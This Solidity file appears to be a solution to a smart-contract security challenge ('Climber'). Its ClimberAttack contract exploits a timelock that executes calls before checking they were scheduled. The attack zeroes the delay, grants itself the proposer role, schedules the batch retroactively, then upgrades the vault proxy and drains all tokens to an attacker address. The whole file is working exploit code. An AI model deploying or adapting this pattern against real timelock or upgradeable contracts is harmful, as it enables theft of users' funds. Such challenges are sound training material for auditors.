// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "./ClimberTimelock.sol";

interface ITimelock{
    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;

    function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external payable;

    function PROPOSER_ROLE() external returns (bytes32);
}

contract ClimberAttack is Initializable, OwnableUpgradeable, UUPSUpgradeable {

    bytes32 public constant SALT = "null";
    address[] internal targets;
    uint256[] internal values;
    bytes[] internal dataElements;

    //helper function to push data
    function _push(address _target, bytes memory _data) internal {
        targets.push(_target);
        values.push(uint256(0));
        dataElements.push(_data);
        
    }

    function attack(
        IERC20 _token, 
        ITimelock _timelock,
        address _vault,
        address _attackerEOA
    ) external { 

        //update delay time
        _push(
            address(_timelock),
            abi.encodeWithSignature(
                "updateDelay(uint64)",
                0
            )
        );

        //update proposer role
        _push(
            address(_timelock),
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                _timelock.PROPOSER_ROLE(),
                address(this)
            )
        );

        //schedule calls
        _push(
            address(this),
            abi.encodeWithSignature(
                "schedule(address)",
                address(_timelock)
            )
        );

        //update and call drain function
        _push(
            address(_vault),
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                address(this),
                abi.encodeWithSignature(
                    "drain(address,address)",
                    address(_token),
                    _attackerEOA
                )
            )
        );

        //execute scheduled callls
        _timelock.execute(targets, values, dataElements, SALT);
        
    }

    //create schedule function to reference
    function schedule(address _timelock) external {
        ITimelock(_timelock).schedule(targets, values, dataElements, SALT);
        
    }

    //create drain function
    function drain(IERC20 _token, address _recipient) external {
        _token.transfer(_recipient, _token.balanceOf(address(this))); 
        
    }

     // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
    function _authorizeUpgrade(address newImplementation) internal onlyOwner override {}


}


